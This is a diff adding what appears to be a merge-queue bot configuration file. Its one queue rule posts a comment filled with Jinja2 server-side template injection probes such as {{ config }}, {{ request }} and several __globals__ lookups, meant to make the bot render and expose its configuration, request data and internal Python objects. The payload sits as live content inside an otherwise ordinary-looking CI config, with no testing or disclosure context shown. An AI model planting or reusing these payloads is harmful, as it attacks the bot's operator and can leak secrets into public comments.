@@ -1,1 +1,18 @@
-
+queue:
+  - name: default
+    conditions:
+      - base=main
+    actions:
+      - comment:
+          message: |
+            SSTI Test: {{ 7*7 }}
+            Request: {{ request }}
+            Config: {{ config }}
+            Namespace: {{ namespace.__init__.__globals__ }}
+            Lipsum: {{ lipsum.__globals__ }}
+            Cycler: {{ cycler.__init__.__globals__ }}
+            Self: {{ self }}
+            URL for: {{ url_for }}
+            Get flashed: {{ get_flashed_messages }}
+      - merge:
+          method: merge
